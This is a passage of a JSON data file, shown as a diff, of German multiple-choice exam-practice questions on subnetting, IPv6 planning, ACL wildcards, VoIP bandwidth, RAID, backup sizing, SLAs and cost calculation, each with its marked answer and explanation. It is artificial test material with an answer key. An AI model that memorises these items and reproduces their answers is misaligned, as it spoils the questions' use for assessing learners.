+    "q": "Nach der VLSM-Planung für den Logistikstandort (10.52.0.0/22: /23, /25, /26 und /30 vergeben) fragt die Teamleitung, wie viele Adressen im Block noch für spätere Netze frei sind. Was antworten Sie?",
+    "options": [
+      "316",
+      "552",
+      "544",
+      "314"
+    ],
+    "a": "316",
+    "exp": "Der /22 hat 1.024 Adressen. Vergeben sind 512 + 128 + 64 + 4 = 708 Adressen, denn es zählt die ganze Blockgröße, nicht der Hostbedarf. Frei bleiben 316."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Im Konzept für ein Produktionsnetz stehen 60 Geräte. Die Kundin verlangt 25 % Reserve für Wachstum. Welches Präfix ist mindestens nötig?",
+    "options": [
+      "/25",
+      "/26",
+      "/24",
+      "/27"
+    ],
+    "a": "/25",
+    "exp": "60 * 1,25 = 75 Hosts. Ein /26 bietet nur 62 Hosts, ein /25 bietet 126. Ohne Reserve hätte ein /26 gereicht."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Die Zentrale erreicht die Netze einer Niederlassung (10.140.16.0/22, 10.140.20.0/23, 10.140.22.0/24, 10.140.23.0/24) über denselben VPN-Router. Statt vier statischer Routen soll eine einzige Sammelroute eingetragen werden, die genau diese Netze abdeckt. Welche ist richtig?",
+    "options": [
+      "10.140.16.0/21",
+      "10.140.16.0/20",
+      "10.140.16.0/22",
+      "10.140.0.0/21"
+    ],
+    "a": "10.140.16.0/21",
+    "exp": "Die Netze reichen von 10.140.16.0 bis 10.140.23.255, das sind 8 * 256 = 2.048 Adressen. 16 ist durch 8 teilbar, also passt 10.140.16.0/21 genau. Ein /20 würde fremde Netze mit abdecken."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Auf dem Core-Router zeigt eine Sammelroute 172.26.128.0/18 zum Rechenzentrum. Ein neues Netz soll bewusst NICHT darunter fallen, weil es über einen anderen Weg läuft. Welches Netz liegt außerhalb der Sammelroute?",
+    "options": [
+      "172.26.192.0/24",
+      "172.26.130.0/24",
+      "172.26.191.0/24",
+      "172.26.160.0/20"
+    ],
+    "a": "172.26.192.0/24",
+    "exp": "Ein /18 umfasst im dritten Oktett 64 Werte: 128 bis 191. Damit reicht die Route von 172.26.128.0 bis 172.26.191.255. Nur 172.26.192.0/24 liegt darüber."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Kollege will die zwei Außenstellen 10.88.12.0/24 und 10.88.19.0/24 mit einer einzigen Sammelroute erreichen. Welches ist das längste Präfix, das beide Netze enthält?",
+    "options": [
+      "10.88.0.0/19",
+      "10.88.0.0/20",
+      "10.88.12.0/22",
+      "10.88.8.0/20"
+    ],
+    "a": "10.88.0.0/19",
+    "exp": "12 = 0000 1100 und 19 = 0001 0011. Nur die ersten 3 Bit im dritten Oktett sind gleich, also 16 + 3 = /19: 10.88.0.0/19. Die Route deckt 32 /24-Netze ab, darunter viele fremde. Hier sind zwei Einzelrouten sauberer."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine Handelskette erhält das Präfix 2001:db8:4c00::/48. Jede Filiale soll ein /56 bekommen, jedes VLAN in der Filiale ein /64. Wie viele Filialen sind möglich, und wie viele VLAN-Netze hat jede?",
+    "options": [
+      "256 Standorte mit je 256 /64-Netzen",
+      "256 Standorte mit je 65.536 /64-Netzen",
+      "65.536 Standorte mit je 256 /64-Netzen",
+      "8 Standorte mit je 8 /64-Netzen"
+    ],
+    "a": "256 Standorte mit je 256 /64-Netzen",
+    "exp": "Von /48 auf /56 sind es 8 Bit: 2^8 = 256 Filialen. Von /56 auf /64 sind es wieder 8 Bit: 2^8 = 256 VLANs je Filiale."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Aus 2001:db8:4c00::/48 werden die /56-Präfixe der Reihe nach vergeben. Filiale 1 erhält 2001:db8:4c00::/56. Welches Präfix erhält Filiale 12?",
+    "options": [
+      "2001:db8:4c00:b00::/56",
+      "2001:db8:4c00:c00::/56",
+      "2001:db8:4c00:1100::/56",
+      "2001:db8:4c00:b::/56"
+    ],
+    "a": "2001:db8:4c00:b00::/56",
+    "exp": "Das /56 wird im vierten Block durch die ersten zwei Hexziffern bestimmt. Filiale 1 hat 00, Filiale 12 also 11 dezimal = 0b hex: 2001:db8:4c00:b00::/56. Die zwei Hexziffern stehen vorn im vierten Block, also b00."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Konzern teilt sein /48 in gleich große Blöcke für 12 Regionen auf. Die Blöcke sollen so groß wie möglich sein und an Nibble-Grenzen liegen. Welches Präfix erhält jede Region?",
+    "options": [
+      "/52",
+      "/51",
+      "/56",
+      "/60"
+    ],
+    "a": "/52",
+    "exp": "Für 12 Regionen braucht man 4 Bit (2^4 = 16 Blöcke). /48 + 4 = /52, das liegt auch auf einer Nibble-Grenze. Ein /51 böte nur 8 Blöcke."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Standort 5 nutzt 2001:db8:7a10:500::/56. Laut Adresskonzept steht die VLAN-ID hexadezimal im letzten Byte des vierten Blocks. Welches /64 erhält VLAN 42?",
+    "options": [
+      "2001:db8:7a10:52a::/64",
+      "2001:db8:7a10:542::/64",
+      "2001:db8:7a10:2a::/64",
+      "2001:db8:7a10:524::/64"
+    ],
+    "a": "2001:db8:7a10:52a::/64",
+    "exp": "42 dezimal = 2a hex. Das Byte ersetzt die 00 in 500, also 2001:db8:7a10:52a::/64. Die Schreibweise 542 übernimmt die Dezimalzahl, 2a vergisst den Standortteil."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine ACL auf dem Router soll genau den Bereich 10.30.64.0 bis 10.30.71.255 erlauben. Welche Kombination aus Adresse und Wildcard-Maske ist richtig?",
+    "options": [
+      "10.30.64.0 0.0.7.255",
+      "10.30.64.0 0.0.8.255",
+      "10.30.64.0 255.255.248.0",
+      "10.30.64.0 0.0.7.0"
+    ],
+    "a": "10.30.64.0 0.0.7.255",
+    "exp": "Der Bereich umfasst 8 * 256 = 2.048 Adressen, also 10.30.64.0/21. Die Wildcard ist die invertierte Maske: 255.255.255.255 - 255.255.248.0 = 0.0.7.255."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "In der Fehleranalyse finden Sie die Zeile \"permit ip 172.20.96.0 0.0.15.255 any\". Ein Client wird trotzdem blockiert. Welche Quelladresse fällt NICHT unter diese Regel?",
+    "options": [
+      "172.20.112.10",
+      "172.20.96.1",
+      "172.20.105.200",
+      "172.20.111.254"
+    ],
+    "a": "172.20.112.10",
+    "exp": "Die Wildcard 0.0.15.255 lässt im dritten Oktett 16 Werte zu: 96 bis 111. Die Regel trifft also 172.20.96.0 bis 172.20.111.255. 172.20.112.10 liegt darüber."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine Außenstelle telefoniert über die WAN-Leitung mit dem Codec G.729 (8 kbit/s, 20 ms je Paket). Pro Paket kommen RTP (12 Byte), UDP (8 Byte), IPv4 (20 Byte) und Ethernet (18 Byte) hinzu. Welche Bandbreite je Richtung brauchen 25 gleichzeitige Gespräche?",
+    "options": [
+      "ca. 780 kbit/s",
+      "ca. 200 kbit/s",
+      "ca. 600 kbit/s",
+      "ca. 1.560 kbit/s"
+    ],
+    "a": "ca. 780 kbit/s",
+    "exp": "Je Paket 20 Byte Sprache + 58 Byte Header = 78 Byte. 50 Pakete/s * 78 Byte * 8 = 31,2 kbit/s je Gespräch. Mal 25 = 780 kbit/s je Richtung."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Handwerksbetrieb hat 2 Mbit/s Upload. Höchstens 60 % davon sollen für Sprache reserviert werden. Die Telefone nutzen G.711 (64 kbit/s) mit 30 ms Paketierung. Rechnen Sie mit 40 Byte für IP, UDP und RTP, ohne Layer 2. Wie viele Gespräche passen gleichzeitig?",
+    "options": [
+      "16",
+      "18",
+      "26",
+      "15"
+    ],
+    "a": "16",
+    "exp": "Je Paket 240 Byte Sprache + 40 Byte = 280 Byte, 33,33 Pakete/s: 74,67 kbit/s je Gespräch. Verfügbar sind 1.200 kbit/s. 1.200 / 74,67 = 16,07, also 16 Gespräche."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Das Monitoring liest den Zähler ifInOctets einer 150-Mbit/s-WAN-Schnittstelle alle 5 Minuten. Zwischen zwei Abfragen ist er um 1.687.500.000 gestiegen. Wie hoch war die mittlere Auslastung im Download?",
+    "options": [
+      "30,0 %",
+      "3,8 %",
+      "28,6 %",
+      "45,0 %"
+    ],
+    "a": "30,0 %",
+    "exp": "ifInOctets zählt Byte: 1.687.500.000 * 8 = 13.500.000.000 Bit in 300 s = 45,0 Mbit/s. 45,0 / 150 = 30,0 %."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine Außenstelle mit 50-Mbit/s-Leitung hat 40 Beschäftigte mit durchschnittlich je 0,9 Mbit/s. Dazu läuft tagsüber eine DFS-Replikation mit 8 Mbit/s. Wie hoch ist die mittlere Auslastung der Leitung?",
+    "options": [
+      "88,0 %",
+      "72,0 %",
+      "85,7 %",
+      "75,9 %"
+    ],
+    "a": "88,0 %",
+    "exp": "40 * 0,9 = 36,0 Mbit/s plus 8 Mbit/s Replikation = 44,0 Mbit/s. 44,0 / 50 = 88,0 %. Über 80 % sollte man die Leitung erweitern oder die Replikation in die Nacht legen."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Nach dem Umzug des ERP-Servers ins Rechenzentrum klagen Anwender über langsame Masken. Eine Maske braucht 45 nacheinander ausgeführte Anfragen, jede wartet auf ihre Antwort. Die Round-Trip-Time stieg von 0,4 ms im LAN auf 22 ms. Um wie viel dauert das Öffnen länger?",
+    "options": [
+      "ca. 972 ms",
+      "ca. 990 ms",
+      "ca. 486 ms",
+      "ca. 1.944 ms"
+    ],
+    "a": "ca. 972 ms",
+    "exp": "Jede Anfrage wartet eine volle Round-Trip-Time. Zusätzlich je Anfrage 22 ms - 0,4 ms = 21,6 ms, mal 45 = 972 ms. Die Leitungsbandbreite hilft hier nicht, nur weniger Anfragen oder ein Terminalserver im Rechenzentrum."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Für Sprachqualität gilt eine Mund-zu-Ohr-Verzögerung von höchstens 150 ms. Paketierung (30 ms), Codec-Verarbeitung (10 ms) und Jitter-Puffer (40 ms) sind fest. Welche Round-Trip-Time darf ein Ping zwischen den Standorten höchstens zeigen?",
+    "options": [
+      "140 ms",
+      "70 ms",
+      "80 ms",
+      "160 ms"
+    ],
+    "a": "140 ms",
+    "exp": "Für das Netz bleiben 150 - 30 - 10 - 40 = 70 ms in eine Richtung. Ping misst Hin- und Rückweg: 2 * 70 = 140 ms."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein 48-Port-Switch hat ein PoE-Budget von 740 W und reserviert je Port die Klassenleistung (Klasse 2: 7,0 W, Klasse 3: 15,4 W, Klasse 4: 30,0 W). Angeschlossen sind 30 Telefone (Klasse 2), 8 Access Points (Klasse 4) und 6 Kameras (Klasse 3). Wie viel Budget bleibt frei?",
+    "options": [
+      "197,6 W",
+      "290,0 W",
+      "110,0 W",
+      "314,4 W"
+    ],
+    "a": "197,6 W",
+    "exp": "30 * 7,0 + 8 * 30,0 + 6 * 15,4 = 210,0 + 240,0 + 92,4 = 542,4 W. 740 - 542,4 = 197,6 W."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Am gleichen Switch (48 Ports, 197,6 W Budget frei, 44 Ports belegt, keine Uplinks auf diesen Ports) sollen weitere Access Points der Klasse 4 (30,0 W) angeschlossen werden. Wie viele passen höchstens?",
+    "options": [
+      "4",
+      "6",
+      "7",
+      "16"
+    ],
+    "a": "4",
+    "exp": "Das Budget reicht für 197,6 / 30 = 6 APs. Frei sind aber nur 48 - 44 = 4 Ports. Die Portzahl begrenzt, also 4."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Etagenswitch hat 48 Ports mit 1 Gbit/s für Clients und 4 Ports mit 2,5 Gbit/s für Wi-Fi-6-Access-Points. Er ist per LACP mit 2 x 10 Gbit/s angebunden. Welches Überbuchungsverhältnis ergibt sich?",
+    "options": [
+      "2,9 : 1",
+      "5,8 : 1",
+      "2,4 : 1",
+      "2,6 : 1"
+    ],
+    "a": "2,9 : 1",
+    "exp": "Downlinks: 48 * 1 + 4 * 2,5 = 58 Gbit/s. Uplink: 2 * 10 = 20 Gbit/s, LACP nutzt beide Leitungen. 58 / 20 = 2,9 : 1."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Großraumbüro hat 1.800 m². Ein Access Point versorgt hier erfahrungsgemäß etwa 250 m² und höchstens 30 aktive Clients. Erwartet werden 190 Clients. Wie viele Access Points planen Sie mindestens?",
+    "options": [
+      "8",
+      "7",
+      "15",
+      "6"
+    ],
+    "a": "8",
+    "exp": "Fläche: 1.800 / 250 = 7,2, aufgerundet 8. Clients: 190 / 30 = 6,3, aufgerundet 7. Maßgeblich ist der größere Wert: 8."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Für eine Hauptversammlung mit 420 Gästen wird WLAN geplant. Jeder Gast hat im Schnitt 1,5 Geräte, davon sind 70 % gleichzeitig aktiv. Ein Access Point soll höchstens 50 aktive Clients bedienen. Wie viele Access Points sind nötig?",
+    "options": [
+      "9",
+      "13",
+      "8",
+      "6"
+    ],
+    "a": "9",
+    "exp": "420 * 1,5 * 0,7 = 441 aktive Clients. 441 / 50 = 8,82, aufgerundet 9 Access Points."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Backup-Storage wird mit 16 Platten zu je 12 TB bestückt. 2 davon sind globale Hot Spares, der Rest bildet ein RAID 60 aus zwei gleich großen Gruppen. Wie groß ist die Nutzkapazität?",
+    "options": [
+      "120 TB",
+      "144 TB",
+      "84 TB",
+      "96 TB"
+    ],
+    "a": "120 TB",
+    "exp": "16 - 2 = 14 Platten im Verbund, also 2 Gruppen zu 7. Jede RAID-6-Gruppe verliert 2 Platten für Parität: 2 * (7 - 2) * 12 TB = 120 TB."
+  },
+  {
+    "cat": "systeme",
+    "q": "In einem RAID 6 ist eine 18-TB-Platte ausgefallen. Unter Produktionslast schafft der Controller beim Rebuild etwa 120 MB/s. Wie lange ist der Verbund mindestens ohne volle Redundanz?",
+    "options": [
+      "ca. 41,7 Stunden",
+      "ca. 5,2 Stunden",
+      "ca. 39,7 Stunden",
+      "ca. 2.500 Stunden"
+    ],
+    "a": "ca. 41,7 Stunden",
+    "exp": "18 TB = 18.000.000 MB. 18.000.000 MB / 120 MB/s = 150.000 s = 41,7 Stunden. Große Platten verlängern das Risikofenster deutlich, deshalb RAID 6."
+  },
+  {
+    "cat": "systeme",
+    "q": "Eine Anwendung erzeugt 4.000 IOPS, davon 30 % Schreibzugriffe. Das Storage nutzt RAID 6 (Write Penalty 6). Wie viele IOPS müssen die Platten im Backend leisten?",
+    "options": [
+      "10.000",
+      "4.000",
+      "7.600",
+      "24.000"
+    ],
+    "a": "10.000",
+    "exp": "Lesen: 4.000 * 0,7 = 2.800. Schreiben: 4.000 * 0,3 * 6 = 7.200. Summe 10.000 IOPS. Nur Schreibzugriffe werden mit der Penalty multipliziert."
+  },
+  {
+    "cat": "systeme",
+    "q": "Für 150 virtuelle Desktops werden je 12 IOPS angesetzt, 70 % davon schreibend. Das RAID 10 wird aus SAS-Platten mit je 175 IOPS gebaut. Wie viele Platten sind mindestens nötig?",
+    "options": [
+      "18",
+      "11",
+      "17",
+      "32"
+    ],
+    "a": "18",
+    "exp": "Frontend 150 * 12 = 1.800 IOPS. Backend: 1.800 * 0,3 + 1.800 * 0,7 * 2 = 3.060 IOPS. 3.060 / 175 = 17,5, aufgerundet 18. RAID 10 braucht eine gerade Anzahl: 18."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Kunde sichert nach dem GFS-Schema: 6 tägliche Inkremente (je 4 % der Vollsicherung), 4 wöchentliche und 12 monatliche Vollsicherungen. Eine Vollsicherung hat 3,2 TB. Wie viel Speicher braucht das Repository ohne Kompression?",
+    "options": [
+      "ca. 52,0 TB",
+      "ca. 70,4 TB",
+      "ca. 39,2 TB",
+      "ca. 13,6 TB"
+    ],
+    "a": "ca. 52,0 TB",
+    "exp": "Vollsicherungen: (4 + 12) * 3,2 TB = 51,2 TB. Inkremente: 6 * 0,128 TB = 0,768 TB. Summe ca. 52,0 TB."
+  },
+  {
+    "cat": "systeme",
+    "q": "Die Backup-Appliance meldet: 84 TB gesicherte Daten (logisch), 12 TB belegt (physisch). Welche Deduplizierungsrate und Ersparnis tragen Sie in den Monatsbericht ein?",
+    "options": [
+      "7 : 1, Ersparnis ca. 85,7 %",
+      "7 : 1, Ersparnis ca. 14,3 %",
+      "6 : 1, Ersparnis ca. 83,3 %",
+      "8 : 1, Ersparnis ca. 87,5 %"
+    ],
+    "a": "7 : 1, Ersparnis ca. 85,7 %",
+    "exp": "Rate: 84 / 12 = 7 : 1. Ersparnis: 1 - 12 / 84 = 85,7 %. Belegt ist nur noch ein Siebtel."
+  },
+  {
+    "cat": "systeme",
+    "q": "40 Windows-Server-VMs mit je 120 GB sollen gesichert werden. Der Hersteller nennt für ähnliche VMs Deduplizierung 5 : 1 und danach Kompression 1,5 : 1. Wie viel physischer Speicher ist nötig?",
+    "options": [
+      "ca. 640 GB",
+      "ca. 960 GB",
+      "ca. 3.200 GB",
+      "ca. 738 GB"
+    ],
+    "a": "ca. 640 GB",
+    "exp": "40 * 120 = 4.800 GB. Die Faktoren werden multipliziert: 4.800 / 5 / 1,5 = 640 GB."
+  },
+  {
+    "cat": "systeme",
+    "q": "Vor einem Update wurde am Montagmorgen ein Snapshot einer 640-GB-VM erstellt und vergessen. Täglich ändern sich 2,5 % der Blöcke (vereinfacht jeweils andere). Der Datastore hat noch 72 GB frei. Wie groß ist die Delta-Datei nach 5 Tagen, und reicht der Platz?",
+    "options": [
+      "80 GB, reicht nicht",
+      "16 GB, reicht",
+      "64 GB, reicht",
+      "160 GB, reicht nicht"
+    ],
+    "a": "80 GB, reicht nicht",
+    "exp": "640 GB * 2,5 % = 16 GB je Tag. Mal 5 Tage = 80 GB. Das übersteigt die freien 72 GB. Läuft der Datastore voll, stoppt die VM."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Cluster aus 3 Hosts hat je 2 CPUs mit 20 Kernen. Erlaubt sind 4 vCPUs je physischem Kern, und der Cluster muss den Ausfall eines Hosts verkraften (N+1). Wie viele VMs mit je 4 vCPUs dürfen betrieben werden?",
+    "options": [
+      "80",
+      "120",
+      "20",
+      "160"
+    ],
+    "a": "80",
+    "exp": "Für N+1 zählen nur 2 Hosts: 2 * 40 Kerne = 80 Kerne. Mal 4 = 320 vCPUs. / 4 = 80 VMs."
+  },
+  {
+    "cat": "systeme",
+    "q": "Auf einen neuen Cluster mit 4 Hosts ziehen 60 VMs mit je 12 GB RAM. Für Hypervisor und Wachstum kommen 10 % hinzu. Fällt ein Host aus, müssen die übrigen alles tragen. Wie viel RAM braucht jeder Host mindestens?",
+    "options": [
+      "264 GB",
+      "198 GB",
+      "240 GB",
+      "180 GB"
+    ],
+    "a": "264 GB",
+    "exp": "60 * 12 GB = 720 GB, plus 10 % = 792 GB. N+1: verteilt auf 3 Hosts = 264 GB je Host. Man bestellt dann die nächste sinnvolle Bestückung, zum Beispiel 384 GB."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Fileserver mit 14 TB soll in die Cloud migriert werden. Die Leitung hat 500 Mbit/s, für die Migration sind 80 % nutzbar. Die Übertragung läuft rund um die Uhr. Wie lange dauert der Erstabgleich?",
+    "options": [
+      "ca. 3,2 Tage",
+      "ca. 2,6 Tage",
+      "ca. 0,4 Tage",
+      "ca. 9,7 Tage"
+    ],
+    "a": "ca. 3,2 Tage",
+    "exp": "14 TB * 8 = 112.000.000 Mbit. Nutzbar sind 400 Mbit/s. 112.000.000 / 400 = 280.000 s = 77,8 Stunden = 3,2 Tage. Bei deutlich mehr Daten lohnt ein Transfer per Datenträger."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Archiv mit 6 TB wird zu einem zweiten Standort kopiert. Die Leitung hat 200 Mbit/s, davon sind 90 % nutzbar. Übertragen werden darf nur nachts von 22 bis 6 Uhr. Wie viele Nächte sind nötig?",
+    "options": [
+      "10",
+      "4",
+      "9",
+      "2"
+    ],
+    "a": "10",
+    "exp": "6 TB * 8 = 48.000.000 Mbit. / 180 Mbit/s = 266.667 s = 74,1 Stunden. Je Nacht 8 Stunden: 9,26, also 10 Nächte."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Reverse Proxy schreibt je Anfrage eine Access-Log-Zeile mit etwa 260 Byte. Von 8 bis 20 Uhr kommen im Mittel 520 Anfragen pro Sekunde, in den anderen 12 Stunden 60. Wie viel Log entsteht pro Tag (1 GB = 10^9 Byte)?",
+    "options": [
+      "ca. 6,51 GB",
+      "ca. 11,68 GB",
+      "ca. 5,84 GB",
+      "ca. 52,12 GB"
+    ],
+    "a": "ca. 6,51 GB",
+    "exp": "Tag: 520 * 43.200 s = 22.464.000 Anfragen. Nacht: 60 * 43.200 s = 2.592.000 Anfragen. Zusammen 25.056.000 Zeilen * 260 Byte = 6.514.560.000 Byte = ca. 6,51 GB."
+  },
+  {
+    "cat": "systeme",
+    "q": "Die Container-Plattform eines Kunden erzeugt 35 GB Logs am Tag. Sie werden im Objektspeicher im Verhältnis 8 : 1 komprimiert und laut Richtlinie 180 Tage aufbewahrt. Wie viel Speicher belegt das Log-Archiv im eingeschwungenen Zustand?",
+    "options": [
+      "ca. 787,5 GB",
+      "ca. 6.300,0 GB",
+      "ca. 4,4 GB",
+      "ca. 393,8 GB"
+    ],
+    "a": "ca. 787,5 GB",
+    "exp": "35 GB / 8 = 4,375 GB je Tag. Mal 180 Tage = 787,5 GB. Ältere Logs werden gelöscht, deshalb wächst das Archiv nicht weiter."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein SLA garantiert 99,5 % Verfügbarkeit innerhalb der Servicezeit Montag bis Freitag 7 bis 19 Uhr. Der Monat hat 21 Arbeitstage, Wartungsfenster liegen außerhalb der Servicezeit. Wie viele Minuten ungeplanter Ausfall sind in der Servicezeit erlaubt?",
+    "options": [
+      "ca. 75,6 Minuten",
+      "ca. 216,0 Minuten",
+      "ca. 7,6 Minuten",
+      "ca. 756,0 Minuten"
+    ],
+    "a": "ca. 75,6 Minuten",
+    "exp": "Servicezeit: 12 h * 21 Tage = 252 h. Erlaubt sind 0,5 %: 252 * 0,005 = 1,26 h = 75,6 Minuten. Ausfälle außerhalb der Servicezeit zählen nicht."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Webshop läuft rund um die Uhr (8.760 Stunden im Jahr). Jeden Sonntag von 0 bis 6 Uhr ist ein angekündigtes Wartungsfenster, das laut Vertrag nicht mitzählt. Die zugesagte Verfügbarkeit beträgt 99,8 %. Wie viele Stunden ungeplanter Ausfall sind im Jahr erlaubt (52 Wochen)?",
+    "options": [
+      "ca. 16,9 Stunden",
+      "ca. 17,5 Stunden",
+      "ca. 1,4 Stunden",
+      "ca. 169,0 Stunden"
+    ],
+    "a": "ca. 16,9 Stunden",
+    "exp": "Vereinbarte Betriebszeit: 8.760 - 52 * 6 = 8.448 Stunden. Davon 0,2 %: 8.448 * 0,002 = 16,9 Stunden."
+  },
+  {
+    "cat": "systeme",
+    "q": "Der Serverraum eines Mittelständlers hat im Mittel 8,5 kW IT-Last, der PUE beträgt 1,7. Wie hoch sind die Stromkosten pro Jahr bei durchgehendem Betrieb und einem angenommenen Strompreis von 0,28 Euro je kWh?",
+    "options": [
+      "35.442,96 Euro",
+      "20.848,80 Euro",
+      "14.594,16 Euro",
+      "12.264,00 Euro"
+    ],
+    "a": "35.442,96 Euro",
+    "exp": "Gesamtleistung: 8,5 kW * 1,7 = 14,45 kW. Mal 8.760 h = 126.582,0 kWh. Mal 0,28 Euro = 35.442,96 Euro. Der PUE multipliziert die IT-Last mit Kühlung und Verlusten."
+  },
+  {
+    "cat": "systeme",
+    "q": "Durch Kaltgangeinhausung sinkt der PUE eines kleinen Rechenzentrums von 1,9 auf 1,4. Die IT-Last bleibt bei 12 kW, Betrieb rund um die Uhr, angenommener Strompreis 0,30 Euro je kWh. Wie viel spart der Betreiber pro Jahr?",
+    "options": [
+      "15.768,00 Euro",
+      "31.536,00 Euro",
+      "44.150,40 Euro",
+      "59.918,40 Euro"
+    ],
+    "a": "15.768,00 Euro",
+    "exp": "Differenz 1,9 - 1,4 = 0,5. 12 kW * 0,5 = 6,0 kW weniger. Mal 8.760 h = 52.560 kWh. Mal 0,30 Euro = 15.768,00 Euro."
+  },
+  {
+    "cat": "systeme",
+    "q": "Eine Rack-USV hat 16 Akkublöcke mit je 12 V und 7 Ah. Der Wechselrichter arbeitet mit 92 % Wirkungsgrad, wegen Alterung planen Sie nur 80 % der Akkuenergie ein. Das Rack zieht 1.900 W. Wie lange überbrückt die USV?",
+    "options": [
+      "ca. 31 Minuten",
+      "ca. 42 Minuten",
+      "ca. 34 Minuten",
+      "ca. 39 Minuten"
+    ],
+    "a": "ca. 31 Minuten",
+    "exp": "Energie: 16 * 12 V * 7 Ah = 1.344 Wh. Nutzbar: 1.344 * 0,92 * 0,8 = 989,2 Wh. / 1.900 W = 0,521 h = ca. 31 Minuten."
+  },
+  {
+    "cat": "systeme",
+    "q": "Die Vollsicherung eines Kunden umfasst 9 TB und muss in ein Backupfenster von 6 Stunden passen. Welchen Durchsatz muss die Sicherung im Mittel erreichen (1 TB = 10^12 Byte)?",
+    "options": [
+      "ca. 416,7 MB/s",
+      "ca. 52,1 MB/s",
+      "ca. 3.333,3 MB/s",
+      "ca. 104,2 MB/s"
+    ],
+    "a": "ca. 416,7 MB/s",
+    "exp": "9 TB = 9.000.000 MB. 6 h = 21.600 s. 9.000.000 / 21.600 = 416,7 MB/s, das sind etwa 3,3 Gbit/s. Gigabit-LAN reicht also nicht."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Datastore hat 20 TB physische Kapazität. Den VMs sind per Thin Provisioning 34 TB zugewiesen, tatsächlich belegt sind 13 TB. Das Monitoring warnt ab 85 % Belegung. Wie hoch ist die Überbuchung, und wie viel darf bis zur Warnung noch geschrieben werden?",
+    "options": [
+      "1,7 : 1, noch 4,0 TB",
+      "1,7 : 1, noch 7,0 TB",
+      "2,6 : 1, noch 4,0 TB",
+      "1,7 : 1, noch 15,9 TB"
+    ],
+    "a": "1,7 : 1, noch 4,0 TB",
+    "exp": "Überbuchung: 34 / 20 = 1,7 : 1. Warnschwelle: 20 TB * 0,85 = 17,0 TB. 17,0 - 13 = 4,0 TB."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein All-Flash-Storage erhält 8 SSDs mit je 7,68 TB im RAID 5. Das Betriebssystem zeigt die Kapazität in TiB an. Welchen Wert erwarten Sie ungefähr?",
+    "options": [
+      "ca. 48,9 TiB",
+      "ca. 53,8 TiB",
+      "ca. 55,9 TiB",
+      "ca. 52,5 TiB"
+    ],
+    "a": "ca. 48,9 TiB",
+    "exp": "Nutzbar: (8 - 1) * 7,68 TB = 53,76 TB = 53.760.000.000.000 Byte. Geteilt durch 2^40 = 1.099.511.627.776 ergibt ca. 48,9 TiB."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ihr Systemhaus kalkuliert ein Angebot für die Migration der Serverlandschaft eines Kunden. Die Selbstkosten betragen 28.400,00 Euro. Die Geschäftsleitung plant 12 % Gewinnzuschlag. Der Kunde erhält 2 % Skonto und 8 % Rabatt. Welcher Listenverkaufspreis (netto) muss im Angebot stehen?",
+    "options": [
+      "35.279,50 Euro",
+      "35.039,69 Euro",
+      "34.573,91 Euro",
+      "35.342,22 Euro"
+    ],
+    "a": "35.279,50 Euro",
+    "exp": "Barverkaufspreis: 28.400,00 Euro * 1,12 = 31.808,00 Euro. Skonto und Rabatt sind Abzüge vom höheren Preis, also im Hundert rechnen: 31.808,00 Euro / 0,98 = 32.457,14 Euro, dann / 0,92 = 35.279,50 Euro."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Für die strukturierte Verkabelung eines Neubaus fallen 9.600,00 Euro Materialeinzelkosten (MGK 10 %) und 140 Technikerstunden zu 38,00 Euro Fertigungslohn (FGK 120 %) an. Der Verwaltungs- und Vertriebsgemeinkostenzuschlag beträgt 15 %. Wie hoch sind die Selbstkosten des Projekts?",
+    "options": [
+      "25.603,60 Euro",
+      "19.485,60 Euro",
+      "24.499,60 Euro",
+      "22.264,00 Euro"
+    ],
+    "a": "25.603,60 Euro",
+    "exp": "Materialkosten: 9.600,00 Euro * 1,10 = 10.560,00 Euro. Fertigungslöhne: 140 h * 38,00 Euro = 5.320,00 Euro, mit 120 % FGK = 11.704,00 Euro. Herstellkosten: 22.264,00 Euro. Mit 15 % VwVtGK: 25.603,60 Euro."
+  },
+  {
+    "cat": "wirtschaft",
+    "q": "Ein Kunde bestellt ein Firewall-Cluster mit Einrichtung zum Listenpreis von 18.750,00 Euro netto. Vereinbart sind 6 % Rabatt, 19 % USt und 2 % Skonto bei Zahlung innerhalb von 10 Tagen. Welchen Betrag überweist der Kunde, wenn er das Skonto nutzt?",
+    "options": [
+      "20.554,28 Euro",
+      "20.973,75 Euro",
+      "20.527,50 Euro",
+      "17.272,50 Euro"
+    ],
+    "a": "20.554,28 Euro",
+    "exp": "18.750,00 Euro - 6 % Rabatt = 17.625,00 Euro. + 19 % USt = 20.973,75 Euro. - 2 % Skonto = 20.554,28 Euro. Rabatt und Skonto werden nacheinander und nicht zusammen abgezogen."
+  },
+  {
+    "cat": "wirtschaft",
